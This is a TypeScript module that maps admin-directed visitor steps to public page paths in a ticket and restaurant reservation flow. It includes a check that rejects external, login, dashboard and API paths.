export type DirectedVisitorData = {
  type?: string;
  restaurant?: unknown;
  restaurantEn?: unknown;
  currentPage?: string;
};

const TICKET_STEP_TO_PATH: Record<number, string> = {
  1: "/registration",
  2: "/booking",
  3: "/checkout",
  4: "/otp",
  5: "/otp",
  6: "/confirmation",
};

const RESTAURANT_STEP_TO_PATH: Record<number, string> = {
  5: "/otp",
  6: "/confirmation",
};

export function isRestaurantVisitor(data: DirectedVisitorData): boolean {
  const currentPage = String(data.currentPage || "");
  return (
    String(data.type || "").toLowerCase() === "restaurant_reservation" ||
    Boolean(data.restaurant) ||
    Boolean(data.restaurantEn) ||
    currentPage === "reserve_checkout" ||
    currentPage === "reserve_otp" ||
    currentPage.startsWith("reserve_")
  );
}

export function getDirectedTargetPath(
  step: number,
  data: DirectedVisitorData,
): string | null {
  const map = isRestaurantVisitor(data)
    ? RESTAURANT_STEP_TO_PATH
    : TICKET_STEP_TO_PATH;
  return map[step] || null;
}

/** Resolve an admin-selected public route while rejecting privileged/external paths. */
export function getDirectedVisitorPath(path: unknown): string | null {
  if (typeof path !== "string") return null;
  const normalized = path.trim();
  if (!normalized.startsWith("/") || normalized.startsWith("//")) return null;
  const pathname = normalized.split(/[?#]/, 1)[0];
  if (
    pathname === "/" ||
    pathname === "/dashboard" ||
    pathname === "/login" ||
    pathname.startsWith("/api/")
  ) return null;
  const allowed = [
    "/home",
    "/registration",
    "/booking",
    "/checkout",
    "/otp",
    "/confirmation",
    "/restaurants",
    "/restaurant/",
    "/reserve/",
  ];
  return allowed.some((prefix) => pathname === prefix || pathname.startsWith(prefix)) ? normalized : null;
}
